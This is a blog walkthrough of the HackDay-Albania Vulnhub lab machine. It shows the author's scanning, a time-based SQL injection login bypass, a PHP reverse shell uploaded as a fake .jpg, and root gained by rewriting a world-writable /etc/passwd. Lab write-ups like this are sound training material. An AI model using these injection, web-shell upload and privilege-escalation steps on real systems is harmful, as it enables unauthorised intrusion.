---
layout: single
title: "Vulnhub Write-up #2 : HackDay-Albania"
excerpt: "Writeup for Hackday-Albania, a nice built and easy linux machine provided from Vulnhub"
date: 2020-05-06
categories:
  - vulnhub
  - infosec
tags:
  - sqli  
  - auth-bypass
  - write-perm
author_profile: true
---

## Summary

In this writeup we are looking at HackDay-Albania from Vulnhub.
I spent time to complete this VM as it took my atention as the first Albanian VM I have ever seen since I am an albanian too and would be interested to take a look. This machine has quite an interesting walkthrough with beginner to intermediate level steps.
Starts with a vulnerable bank from where we can drop a reverse shell and then write to /etc/passwd to escalate to root. Lets dig in:

## Enumeration 

### nmap
As always starting with a nmap scan after setting up the image to virtualbox and powering it on we get those results :
```
root@kali:~# nmap -sC -A 192.168.1.6
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-06 20:00 CEST
Nmap scan report for 192.168.1.6
Host is up (0.00025s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 39:76:a2:f0:82:5f:1f:75:0d:e4:c4:c5:a7:48:b1:58 (RSA)
|   256 21:fe:63:45:2c:cb:a1:f1:b6:ba:36:dd:ed:d3:d9:48 (ECDSA)
|_  256 25:94:fb:00:c2:c0:ef:30:4a:02:d2:39:d5:57:17:a8 (ED25519)
8008/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 26 disallowed entries (15 shown)
| /rkfpuzrahngvat/ /slgqvasbiohwbu/ /tmhrwbtcjpixcv/ 
| /vojtydvelrkzex/ /wpkuzewfmslafy/ /xqlvafxgntmbgz/ /yrmwbgyhouncha/ 
| /zsnxchzipvodib/ /atoydiajqwpejc/ /bupzejbkrxqfkd/ /cvqafkclsyrgle/ 
|_/unisxcudkqjydw/ /dwrbgldmtzshmf/ /exschmenuating/ /fytdinfovbujoh/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: HackDay Albania 2016
MAC Address: 08:00:27:DC:2E:3D (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.25 ms 192.168.1.6

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.65 seconds
```
Port 22 (SSH) and Port 8008 (HTTP) opened...
The HTTP Server comes up with a bunch of random word directories which seem weird to me.

### Website
I firstly tried to navigate to the HTTP server and look for something around : 

![message](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/HackDay-Vulnhub/1.png)

This is the image presented in the root page alongside with a message written in Albania language which means :

`If it's me, I know where to go ;)`

Interesting...

After failing to grab any other possible information from the http server I randomly picked one and tried to navigate to it and ended up with the following result :
![wrong](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/HackDay-Vulnhub/2.png)

Another image with a message in albanian which means : 

`is this the right directory? or am I loosing my time?`

I found this helpful because while randomly navigating to other directories this could help us identify the useful directory...
After some attempts `/unisxcudkqjydw/` returns with the following message :

``IS there any /vulnbank/ in there ??? ``

## Initial Foothold

I tried to navigate to ``/unisxcudkqjydw/vulnbank`` and it seemed like it was a valid directory with content on it :

![dir](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/HackDay-Vulnhub/3.png)

Accessing ``client/`` shows the following site :

![client](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/HackDay-Vulnhub/4.png)

### SQL Injection

A login page which is probably vulnerable to sql injection , however the usual manual injections didnt work so I decided to fire sqlmap against it :

```
root@kali:~# sqlmap -u http://192.168.1.6:8008/unisxcudkqjydw/vulnbank/client/login.php --forms
```

![sqlmap](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/HackDay-Vulnhub/5.png)

``ctSS' RLIKE SLEEP(5)-- sohc`` and empty username seems to be legit for sqlmap... so why not for us? 
I went to try it to the login page and was able to succesfully bypass the login page :

![site](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/HackDay-Vulnhub/6.png)

A upload option is presented to us in the main page which means : MONEY! 
I tried to upload a random thing and got the following warning : 

``After we got hacked we our allowing only image files to upload such as jpg , jpeg , bmp etc...``

My first thought was that we could make a reverse shell written in php and inject magic bytes in the beggining of the file so the server would identify it as a JPG file so I went ahead to try that :
```
root@kali:~# echo -e '\xff\xd8\xff\xdb' > fake.php.jpg
```

After injecting the magic byte to the ``fake.php.jpg`` we can go ahead and edit it with `vi` or any preferred text editor and paste the php reverse shell code.

Afterwards I tried to upload , however no luck with this method and no reverse shell was poped which made me confused...
I made a second attempt but this time I simply copied the php reverse shell code in a .jpg file format and tried to upload it :
```
root@kali:~# cp /usr/share/webshells/php/php-reverse-shell.php shelltest.jpg
```

After clicking `View Ticket` in the main page I finally got a response :

![site](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/HackDay-Vulnhub/8.png)

Finally a reverse shell as `www-data` 

## Escalating to User
I quickly located the bank files in machine and went through config.php to see for a possible password reuse somewhere :

![site](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/HackDay-Vulnhub/9.png)

Woaah!! Nice password over there , but not the correct one to `su` as ``taviso`` so I used the credentials to login to the mysql database and maybe find some other passwords :

![site](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/HackDay-Vulnhub/11.png)

2 more useless passwords appeared which again didnt work , so I began to enumerate more...

### write permissions

I was trying to find writable permissions when I found something interesting :
```
www-data@hackday:/$ ls -la /etc/passwd
ls -la /etc/passwd
-rw-r--rw- 1 root root 1623 Oct 22  2016 /etc/passwd
```

I have write access over /etc/passwd and the first guess was to add a new password for user : ``taviso`` so I copied the contents of file in my machine , generated a new password for taviso : ``albania`` and re-uploaded the file to the machine :

```
root@kali:~# openssl passwd -1
Password: 
Verifying - Password: 
$1$JMlW1qnd$3BOKOiF3ePP4aJ.RuAf4e0
```
```
www-data@hackday:/tmp$ cp passwd /etc/passwd
cp passwd /etc/passwd
www-data@hackday:/tmp$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
taviso:$1$JMlW1qnd$3BOKOiF3ePP4aJ.RuAf4e0:1000:1000:Taviso,,,:/home/taviso:/bin/bash
www-data@hackday:/tmp$ 
```

Now I can simply try to su as taviso using the password we set :
![site](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/HackDay-Vulnhub/12.png)

And ... we are in as Taviso!


## Root Privesc
The first basic enumeration for the next privesc ``sudo -l`` gave me enough to do the next step : 

```
taviso@hackday:/tmp$ sudo -l
sudo -l
[sudo] password for taviso: albania

Matching Defaults entries for taviso on hackday:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User taviso may run the following commands on hackday:
    (ALL : ALL) ALL
taviso@hackday:/tmp$ 
```
### root shell

Seems like user ``Taviso`` has permission to run any command as sudo and seems like we can simply use ``sudo su`` to grab a root shell:

![site](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/HackDay-Vulnhub/13.png)

I really liked this machine and I was so excited to try out an Albanian Machine. 


